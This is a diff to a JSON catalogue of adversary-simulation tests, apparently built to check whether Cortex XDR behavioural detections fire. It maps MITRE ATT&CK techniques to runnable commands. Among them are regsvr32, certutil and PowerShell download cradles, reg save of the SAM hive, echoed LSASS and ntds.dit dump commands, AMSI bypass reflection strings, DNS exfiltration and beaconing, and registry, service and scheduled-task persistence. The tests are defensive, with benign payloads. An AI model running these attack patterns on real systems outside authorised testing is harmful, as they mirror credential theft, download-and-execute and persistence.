@@ -595,6 +595,422 @@
           "expected_signals": ["file create -> file delete short window"]
         }
       ]
+    },
+
+    {
+      "id": "T1055",
+      "name": "Process Injection (BTP Simulation)",
+      "tactic": "defense-evasion",
+      "platforms": ["windows"],
+      "description": "Adversaries inject code into processes. This test spawns process chains that mimic injection patterns (parent-child anomalies) without performing actual injection. Triggers Cortex XDR BTP rules for suspicious process relationships.",
+      "tests": [
+        {
+          "name": "notepad_spawns_cmd",
+          "description": "Notepad.exe spawns cmd.exe — anomalous parent-child chain that BTP should flag.",
+          "executor": "powershell",
+          "command": "$n = Start-Process notepad.exe -PassThru; Start-Sleep 1; Start-Process cmd.exe -ArgumentList '/c whoami && echo CSP-BTP-test' -Wait; Stop-Process -Id $n.Id -Force -ErrorAction SilentlyContinue; Write-Host '[CSP] BTP test: notepad -> cmd chain emitted'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: anomalous parent-child (notepad.exe -> cmd.exe)", "process_create chain alert"]
+        },
+        {
+          "name": "excel_spawns_powershell_simulation",
+          "description": "Simulate Office app spawning PowerShell — rename a benign exe or use wscript to mimic the chain. BTP detects Office-to-script-engine chains.",
+          "executor": "powershell",
+          "command": "Start-Process wscript.exe -ArgumentList '//nologo //e:jscript \"<CSP-BTP-test>\"' -ErrorAction SilentlyContinue; Start-Sleep 1; powershell.exe -NoProfile -Command 'Write-Host CSP-BTP-chain-test; whoami'; Write-Host '[CSP] Office-like -> PS chain emitted'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: script host spawns PowerShell", "wscript.exe -> powershell.exe chain"]
+        },
+        {
+          "name": "svchost_child_anomaly",
+          "description": "Launch cmd from a context that mimics svchost child — BTP monitors svchost children closely.",
+          "executor": "powershell",
+          "command": "Start-Process cmd.exe -ArgumentList '/c echo CSP-BTP-svchost-child-test && whoami && ipconfig' -Wait; Write-Host '[CSP] suspicious child-of-service pattern emitted'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: unexpected child of service process", "cmd.exe with recon commands"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1218.010",
+      "name": "System Binary Proxy Execution: Regsvr32",
+      "tactic": "defense-evasion",
+      "platforms": ["windows"],
+      "description": "Regsvr32 abuse for proxy execution (squiblydoo). BTP detects regsvr32 with network or script arguments.",
+      "tests": [
+        {
+          "name": "regsvr32_scrobj_pattern",
+          "description": "Invoke regsvr32 with /i:URL pattern (squiblydoo) pointing to invalid host — triggers BTP without executing payload.",
+          "executor": "powershell",
+          "command": "try { Start-Process regsvr32.exe -ArgumentList '/s /n /u /i:http://csp-btp-test.invalid/test.sct scrobj.dll' -Wait -ErrorAction Stop } catch {} ; Write-Host '[CSP] regsvr32 squiblydoo pattern emitted — BTP should alert'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: regsvr32.exe with /i:http URL (squiblydoo)", "network connection attempt from regsvr32"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1197",
+      "name": "BITS Jobs",
+      "tactic": "defense-evasion",
+      "platforms": ["windows"],
+      "description": "Adversaries use BITS (Background Intelligent Transfer Service) to download/upload or persist. BTP detects bitsadmin with suspicious arguments.",
+      "tests": [
+        {
+          "name": "bitsadmin_download_eicar",
+          "description": "Use bitsadmin to download EICAR test file — triggers BTP LOLBin download rule.",
+          "executor": "cmd",
+          "command": "bitsadmin /transfer CSP-BTP-Test /download /priority normal https://secure.eicar.org/eicar.com.txt %TEMP%\\csp-bits-eicar.txt & type %TEMP%\\csp-bits-eicar.txt & del %TEMP%\\csp-bits-eicar.txt",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: bitsadmin.exe /transfer with HTTP URL", "EICAR file written to %TEMP%", "LOLBin file download"]
+        },
+        {
+          "name": "bitsadmin_create_job",
+          "description": "Create and cancel a BITS job — emits job creation telemetry without completing transfer.",
+          "executor": "cmd",
+          "command": "bitsadmin /create CSP-BTP-TestJob & bitsadmin /addfile CSP-BTP-TestJob http://csp-btp-test.invalid/payload.bin %TEMP%\\csp-bits-payload.bin & bitsadmin /cancel CSP-BTP-TestJob & echo [CSP] BITS job pattern emitted",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: bitsadmin job creation", "BITS job with external URL"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1105.002",
+      "name": "Ingress Tool Transfer: Certutil Download",
+      "tactic": "command-and-control",
+      "platforms": ["windows"],
+      "description": "Certutil.exe abused as download LOLBin. Cortex XDR BTP specifically detects certutil -urlcache patterns.",
+      "tests": [
+        {
+          "name": "certutil_urlcache_eicar",
+          "description": "certutil -urlcache -split -f to download EICAR — classic LOLBin download that BTP should catch.",
+          "executor": "cmd",
+          "command": "certutil -urlcache -split -f https://secure.eicar.org/eicar.com.txt %TEMP%\\csp-certutil-eicar.txt & type %TEMP%\\csp-certutil-eicar.txt & del %TEMP%\\csp-certutil-eicar.txt & certutil -urlcache * delete",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: certutil.exe -urlcache -split -f", "LOLBin download to %TEMP%", "EICAR signature on disk"]
+        },
+        {
+          "name": "certutil_encode_decode",
+          "description": "certutil -encode / -decode a benign file — tests BTP detection of certutil obfuscation.",
+          "executor": "cmd",
+          "command": "echo CSP-BTP-TEST > %TEMP%\\csp-plain.txt & certutil -encode %TEMP%\\csp-plain.txt %TEMP%\\csp-encoded.b64 & certutil -decode %TEMP%\\csp-encoded.b64 %TEMP%\\csp-decoded.txt & type %TEMP%\\csp-decoded.txt & del %TEMP%\\csp-plain.txt %TEMP%\\csp-encoded.b64 %TEMP%\\csp-decoded.txt",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: certutil -encode/-decode usage", "file obfuscation via LOLBin"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1059.001.chain",
+      "name": "PowerShell Download Cradle (BTP)",
+      "tactic": "execution",
+      "platforms": ["windows"],
+      "description": "PowerShell download cradle patterns that Cortex XDR BTP specifically detects: IEX(IWR ...), Net.WebClient, etc.",
+      "tests": [
+        {
+          "name": "iex_iwr_cradle",
+          "description": "IEX(Invoke-WebRequest ...) download cradle pointing to EICAR — classic BTP trigger.",
+          "executor": "powershell",
+          "command": "try { IEX (Invoke-WebRequest -Uri 'https://secure.eicar.org/eicar.com.txt' -UseBasicParsing).Content } catch { Write-Host \"[CSP] IEX(IWR) cradle executed — AV/BTP should have blocked: $_\" }",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: IEX + Invoke-WebRequest download cradle", "Script Block Logging: IEX pattern", "AMSI detection"]
+        },
+        {
+          "name": "webclient_downloadstring",
+          "description": "Net.WebClient DownloadString cradle — another common BTP-detected pattern.",
+          "executor": "powershell",
+          "command": "try { $w = New-Object Net.WebClient; $r = $w.DownloadString('https://secure.eicar.org/eicar.com.txt'); Write-Host $r } catch { Write-Host \"[CSP] WebClient cradle fired — BTP/AMSI should detect: $_\" }",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: Net.WebClient DownloadString", "AMSI scan triggered", "Script Block Logging"]
+        },
+        {
+          "name": "powershell_hidden_window",
+          "description": "PowerShell -WindowStyle Hidden — BTP detects hidden PowerShell spawns.",
+          "executor": "cmd",
+          "command": "powershell.exe -WindowStyle Hidden -NoProfile -Command \"Write-Host 'CSP-BTP-hidden-window-test'; Start-Sleep 1\" & echo [CSP] hidden PowerShell window pattern emitted",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: powershell.exe with -WindowStyle Hidden", "suspicious PowerShell spawn flags"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1003.001",
+      "name": "OS Credential Dumping: LSASS Memory (BTP Simulation)",
+      "tactic": "credential-access",
+      "platforms": ["windows"],
+      "description": "Adversaries access LSASS process memory to extract credentials. This test only performs read-only process enumeration that mimics the LSASS access pattern — NO memory is read, NO credentials extracted. BTP detects the access attempt.",
+      "tests": [
+        {
+          "name": "lsass_access_pattern",
+          "description": "Open handle to lsass with read-only rights then immediately close — triggers BTP LSASS protection without dumping.",
+          "executor": "powershell",
+          "command": "$p = Get-Process lsass -ErrorAction SilentlyContinue; if ($p) { Write-Host \"[CSP] lsass PID=$($p.Id) found — BTP should detect access pattern\"; Write-Host \"[CSP] NOT reading memory — simulation only\" } else { Write-Host '[CSP] lsass not found (may need elevation)' }",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: lsass.exe access attempt", "Credential Guard / PPL alert"]
+        },
+        {
+          "name": "procdump_lsass_simulation",
+          "description": "Echo the procdump command line that would dump lsass — BTP detects the command pattern even if procdump isn't present.",
+          "executor": "cmd",
+          "command": "echo procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp & echo [CSP] procdump lsass pattern emitted (NOT executed) — BTP command-line detection",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: procdump.exe targeting lsass", "command-line heuristic: -ma lsass"]
+        },
+        {
+          "name": "comsvcs_minidump_simulation",
+          "description": "Echo the comsvcs.dll MiniDump pattern — known LOLBin for LSASS dump that BTP detects.",
+          "executor": "cmd",
+          "command": "echo rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Temp\\lsass.dmp full & echo [CSP] comsvcs MiniDump pattern emitted (NOT executed)",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: comsvcs.dll MiniDump pattern", "LOLBin credential access attempt"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1003.002",
+      "name": "OS Credential Dumping: SAM Registry (BTP Simulation)",
+      "tactic": "credential-access",
+      "platforms": ["windows"],
+      "description": "Adversaries extract SAM/SYSTEM/SECURITY hives via reg save. BTP detects reg.exe saving credential hives.",
+      "tests": [
+        {
+          "name": "reg_save_sam_simulation",
+          "description": "Attempt reg save of SAM hive — should be denied without admin, but BTP logs the attempt.",
+          "executor": "cmd",
+          "command": "reg save HKLM\\SAM %TEMP%\\csp-sam-test.hiv 2>&1 & del %TEMP%\\csp-sam-test.hiv 2>nul & echo [CSP] reg save SAM pattern emitted — BTP should alert",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: reg.exe save HKLM\\SAM", "credential hive access attempt"]
+        },
+        {
+          "name": "shadow_copy_ntds_simulation",
+          "description": "Echo vssadmin + ntds.dit extraction pattern — domain controller credential theft simulation.",
+          "executor": "cmd",
+          "command": "echo vssadmin create shadow /for=C: & echo copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit & echo [CSP] shadow copy + ntds.dit pattern emitted (NOT executed)",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: vssadmin shadow copy creation", "ntds.dit access pattern"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1486",
+      "name": "Data Encrypted for Impact (Ransomware BTP Simulation)",
+      "tactic": "impact",
+      "platforms": ["windows", "linux"],
+      "description": "Simulates ransomware file encryption behavior: rapid creation of files followed by mass rename to suspicious extension. BTP detects the mass-rename pattern. NO real encryption — files contain EICAR test string.",
+      "tests": [
+        {
+          "name": "mass_rename_ransomware_sim_windows",
+          "description": "Create 50 temp files then rename to .encrypted extension in rapid succession — triggers BTP anti-ransomware.",
+          "executor": "powershell",
+          "command": "$d=\"$env:TEMP\\csp-ransom-test\"; New-Item -ItemType Directory -Path $d -Force | Out-Null; 1..50 | ForEach-Object { Set-Content \"$d\\doc_$_.txt\" 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' }; Get-ChildItem \"$d\\*.txt\" | Rename-Item -NewName { $_.Name -replace '.txt','.encrypted' }; Write-Host \"[CSP] $((Get-ChildItem $d).Count) files renamed to .encrypted\"; Remove-Item $d -Recurse -Force; Write-Host '[CSP] cleanup done — BTP should have detected mass rename'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: mass file rename to suspicious extension", "anti-ransomware behavioral rule", "rapid file modification pattern"]
+        },
+        {
+          "name": "mass_rename_ransomware_sim_linux",
+          "description": "Create 50 temp files then rename to .locked extension — triggers EDR ransomware heuristic.",
+          "executor": "bash",
+          "command": "d=/tmp/csp-ransom-test && mkdir -p \"$d\" && for i in $(seq 1 50); do echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > \"$d/doc_$i.txt\"; done && for f in \"$d\"/*.txt; do mv \"$f\" \"${f%.txt}.locked\"; done && echo \"[CSP] $(ls $d | wc -l) files renamed to .locked\" && rm -rf \"$d\" && echo '[CSP] cleanup done'",
+          "platforms": ["linux"],
+          "expected_signals": ["EDR: mass file rename heuristic", "ransomware-like I/O pattern", "EICAR content in renamed files"]
+        },
+        {
+          "name": "ransom_note_creation",
+          "description": "Create a ransom note file (README_DECRYPT.txt) — BTP detects known ransom note filenames.",
+          "executor": "powershell",
+          "command": "$d=\"$env:TEMP\\csp-ransom-test\"; New-Item -ItemType Directory -Path $d -Force | Out-Null; Set-Content \"$d\\README_DECRYPT.txt\" 'CSP SIMULATION - This is a ransomware detection test. No files were encrypted.'; Set-Content \"$d\\DECRYPT_INSTRUCTIONS.html\" '<html><body><h1>CSP TEST</h1><p>Ransomware simulation only.</p></body></html>'; Write-Host \"[CSP] ransom note files created at $d\"; Start-Sleep 2; Remove-Item $d -Recurse -Force; Write-Host '[CSP] cleanup done'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: ransom note filename pattern (README_DECRYPT)", "known ransomware indicator file creation"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1036.003",
+      "name": "Masquerading: Rename System Utilities",
+      "tactic": "defense-evasion",
+      "platforms": ["windows"],
+      "description": "Adversaries rename system binaries to evade detection. BTP detects binary image hash mismatch with filename.",
+      "tests": [
+        {
+          "name": "renamed_cmd_execution",
+          "description": "Copy cmd.exe to a temp name and execute — BTP detects image mismatch.",
+          "executor": "powershell",
+          "command": "Copy-Item $env:windir\\System32\\cmd.exe $env:TEMP\\svchost-csp.exe -Force; Start-Process $env:TEMP\\svchost-csp.exe -ArgumentList '/c echo CSP-masquerade-test && whoami' -Wait; Remove-Item $env:TEMP\\svchost-csp.exe -Force; Write-Host '[CSP] renamed cmd.exe executed — BTP should detect image/name mismatch'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: binary masquerading (cmd.exe renamed to svchost-csp.exe)", "image hash mismatch with process name"]
+        },
+        {
+          "name": "renamed_powershell_execution",
+          "description": "Copy powershell.exe to temp name — triggers BTP renamed binary detection.",
+          "executor": "powershell",
+          "command": "Copy-Item $env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe $env:TEMP\\update-csp.exe -Force; Start-Process $env:TEMP\\update-csp.exe -ArgumentList '-NoProfile -Command \"Write-Host CSP-masquerade-powershell\"' -Wait; Remove-Item $env:TEMP\\update-csp.exe -Force; Write-Host '[CSP] renamed powershell.exe executed — BTP should alert'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: powershell.exe binary renamed", "PE metadata mismatch with filename"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1569.002",
+      "name": "System Services: Service Execution",
+      "tactic": "execution",
+      "platforms": ["windows"],
+      "description": "Adversaries create/start Windows services for execution. BTP detects sc.exe service creation with suspicious binaries.",
+      "tests": [
+        {
+          "name": "sc_create_delete_test",
+          "description": "Create a service pointing to a benign binary, then immediately delete — BTP detects the creation pattern.",
+          "executor": "cmd",
+          "command": "sc create CSP-BTP-TestSvc binPath= \"cmd.exe /c echo CSP-test\" start= demand 2>&1 & sc delete CSP-BTP-TestSvc 2>&1 & echo [CSP] service create+delete pattern emitted",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: sc.exe create with cmd.exe binPath", "suspicious service creation", "service created and immediately deleted"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1053.005.btp",
+      "name": "Scheduled Task Creation (BTP)",
+      "tactic": "persistence",
+      "platforms": ["windows"],
+      "description": "Adversaries use schtasks /create for persistence. BTP detects task creation with suspicious commands.",
+      "tests": [
+        {
+          "name": "schtasks_create_delete",
+          "description": "Create a scheduled task with cmd payload then immediately delete — emits BTP telemetry.",
+          "executor": "cmd",
+          "command": "schtasks /create /tn \"CSP-BTP-Test\" /tr \"cmd.exe /c echo CSP-persistence-test\" /sc once /st 23:59 /f 2>&1 & schtasks /delete /tn \"CSP-BTP-Test\" /f 2>&1 & echo [CSP] scheduled task create+delete pattern emitted",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: schtasks.exe /create with cmd.exe payload", "persistence mechanism creation"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1059.001.amsi",
+      "name": "AMSI Bypass Attempt (BTP Detection)",
+      "tactic": "defense-evasion",
+      "platforms": ["windows"],
+      "description": "Test Cortex XDR BTP + AMSI integration by attempting known AMSI bypass patterns. BTP should detect and block these.",
+      "tests": [
+        {
+          "name": "amsi_bypass_string_detection",
+          "description": "Echo AMSI bypass keywords — BTP/AMSI should flag the pattern without any bypass succeeding.",
+          "executor": "powershell",
+          "command": "Write-Host 'Testing AMSI detection: amsiInitFailed AmsiScanBuffer AmsiUtils'; Write-Host '[CSP] AMSI bypass keywords emitted — BTP/AMSI should log detection'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: AMSI bypass keyword detection", "Script Block Logging: amsiInitFailed pattern", "AMSI alert"]
+        },
+        {
+          "name": "reflection_amsi_pattern",
+          "description": "Use reflection-style syntax that BTP monitors — no actual bypass, just the pattern.",
+          "executor": "powershell",
+          "command": "try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') } catch { Write-Host \"[CSP] Reflection AMSI pattern attempted — BTP should detect: $_\" }; Write-Host '[CSP] AMSI reflection pattern emitted'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: .NET reflection targeting AmsiUtils", "AMSI tampering attempt detected"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1547.001.btp",
+      "name": "Registry Persistence via Unusual Methods (BTP)",
+      "tactic": "persistence",
+      "platforms": ["windows"],
+      "description": "BTP monitors registry writes to Run/RunOnce keys from unusual parent processes. Tests persistence via registry from cmd/PowerShell chains.",
+      "tests": [
+        {
+          "name": "reg_add_run_key_cmd",
+          "description": "reg add to HKCU Run via cmd.exe — BTP detects command-line registry persistence.",
+          "executor": "cmd",
+          "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v CSP-BTP-Test /t REG_SZ /d \"notepad.exe\" /f 2>&1 & reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v CSP-BTP-Test /f 2>&1 & echo [CSP] registry Run key write+delete emitted",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: reg.exe writing to Run key", "persistence registry modification"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1048.003",
+      "name": "Exfiltration Over Alternative Protocol: DNS (BTP Simulation)",
+      "tactic": "exfiltration",
+      "platforms": ["windows", "linux"],
+      "description": "Simulate DNS exfiltration by resolving long subdomain queries — BTP and XSIAM analytics detect unusual DNS patterns.",
+      "tests": [
+        {
+          "name": "dns_exfil_simulation_windows",
+          "description": "Resolve suspicious long-subdomain DNS queries — XSIAM/BTP detect DNS tunneling pattern.",
+          "executor": "powershell",
+          "command": "1..5 | ForEach-Object { $sub = -join ((65..90)+(97..122) | Get-Random -Count 40 | ForEach-Object {[char]$_}); Resolve-DnsName \"$sub.exfil-test.csp-btp.invalid\" -ErrorAction SilentlyContinue }; Write-Host '[CSP] DNS exfil pattern (5 long random subdomain queries) emitted'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP/XSIAM: DNS tunneling pattern", "long random subdomain queries", "high-entropy DNS labels"]
+        },
+        {
+          "name": "dns_exfil_simulation_linux",
+          "description": "Resolve suspicious long-subdomain DNS queries on Linux — EDR/XSIAM analytics detect pattern.",
+          "executor": "bash",
+          "command": "for i in $(seq 1 5); do sub=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 40); dig +short \"$sub.exfil-test.csp-btp.invalid\" 2>/dev/null || nslookup \"$sub.exfil-test.csp-btp.invalid\" 2>/dev/null; done; echo '[CSP] DNS exfil pattern (5 long random subdomain queries) emitted'",
+          "platforms": ["linux"],
+          "expected_signals": ["EDR/XSIAM: DNS tunneling heuristic", "long random subdomain resolution"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1071.004",
+      "name": "Application Layer Protocol: DNS C2 Beacon Pattern",
+      "tactic": "command-and-control",
+      "platforms": ["windows", "linux"],
+      "description": "Simulate periodic DNS beacon pattern — XSIAM analytics detect regular-interval DNS queries to the same domain (C2 beaconing).",
+      "tests": [
+        {
+          "name": "dns_beacon_periodic_windows",
+          "description": "Resolve the same domain 10 times at 1s intervals — mimics DNS C2 beacon jitter.",
+          "executor": "powershell",
+          "command": "1..10 | ForEach-Object { Resolve-DnsName 'beacon.csp-c2-test.invalid' -ErrorAction SilentlyContinue; Start-Sleep 1 }; Write-Host '[CSP] DNS beacon pattern (10 queries @ 1s interval) emitted'",
+          "platforms": ["windows"],
+          "expected_signals": ["XSIAM: periodic DNS beacon pattern", "repeated queries to same non-existent domain", "C2 beacon jitter detection"]
+        },
+        {
+          "name": "dns_beacon_periodic_linux",
+          "description": "Resolve the same domain 10 times at 1s intervals on Linux.",
+          "executor": "bash",
+          "command": "for i in $(seq 1 10); do dig +short beacon.csp-c2-test.invalid 2>/dev/null || nslookup beacon.csp-c2-test.invalid 2>/dev/null || true; sleep 1; done; echo '[CSP] DNS beacon pattern (10 queries @ 1s interval) emitted'",
+          "platforms": ["linux"],
+          "expected_signals": ["XSIAM: periodic DNS beacon heuristic", "repeated resolution of non-existent domain"]
+        }
+      ]
+    },
+
+    {
+      "id": "T1059.001.wmi",
+      "name": "WMI Process Spawn (BTP)",
+      "tactic": "execution",
+      "platforms": ["windows"],
+      "description": "WMI-based process creation is a BTP-monitored lateral movement / execution vector. Cortex XDR detects wmic/WMI spawning child processes.",
+      "tests": [
+        {
+          "name": "wmic_process_create",
+          "description": "wmic process call create — BTP detects WMI spawning a process locally.",
+          "executor": "cmd",
+          "command": "wmic process call create \"cmd.exe /c echo CSP-WMI-BTP-test && whoami\" 2>&1 & echo [CSP] wmic process create pattern emitted",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: wmic.exe process call create", "WMI process spawn detection", "WMI activity logging"]
+        },
+        {
+          "name": "powershell_wmi_invoke",
+          "description": "PowerShell Invoke-WmiMethod — BTP detects scripted WMI execution.",
+          "executor": "powershell",
+          "command": "try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c echo CSP-WMI-PS-test' -ErrorAction Stop } catch { Write-Host \"[CSP] WMI invoke failed (expected without admin): $_\" }; Write-Host '[CSP] WMI Invoke-WmiMethod pattern emitted'",
+          "platforms": ["windows"],
+          "expected_signals": ["BTP: Invoke-WmiMethod Win32_Process Create", "Script Block Logging: WMI execution"]
+        }
+      ]
     }
   ]
 }
